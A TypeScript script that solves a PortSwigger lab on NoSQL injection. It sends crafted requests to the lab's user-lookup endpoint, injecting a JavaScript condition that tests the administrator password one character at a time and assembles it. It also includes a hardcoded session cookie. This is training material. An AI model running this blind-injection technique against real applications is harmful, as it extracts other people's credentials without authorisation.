/**
 * PortSwigger Lab: Exploiting NoSQL injection to extract data
 * https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data 
 */

import { Sess } from "../base"

const LABID = "0a9c007003478b4c81a20cd1005000f4"

const iter = async (index: number, char: string) => {
	return await Sess.req`
		GET /user/lookup?user=administrator'%20%26%26%20this.password%5b${index + ""}%5d%20%3d%3d%20'${char}'%20%7c%7c%20' HTTP/2	
		Host: ${LABID}.web-security-academy.net
		Cookie: session=iDrPWi5n0f4pDRJ7vmxogZ5c4zgJEtD1
		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
		Sec-Ch-Ua-Mobile: ?0
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
		Sec-Ch-Ua-Platform: "macOS"
		Accept: */*
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.6
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: cors
		Sec-Fetch-Dest: empty
		Referer: https://${LABID}.web-security-academy.net/my-account?id=wiener
		Accept-Encoding: gzip, deflate, br
	`.then(r => "role" in JSON.parse(r.body()))
}

let index = 0
let password = ""
const chars = "abcdefghijklmnopqrstuvwxyz0123456789".split("")

for (let i = 0; i < 50; i++) {
	let found = false
	for (const char of chars) {
		if (await iter(index, char)) {
			console.log(`SUCCESS CHAR ${index}: ${char}`)
			password += char
			found = true
			break
		}
	}

	if (found) {
		index++
	} else {
		console.log(`FAILURE CHAR ${index}`)
		break
	}
}

console.log(`PASSWORD: ${password}`)
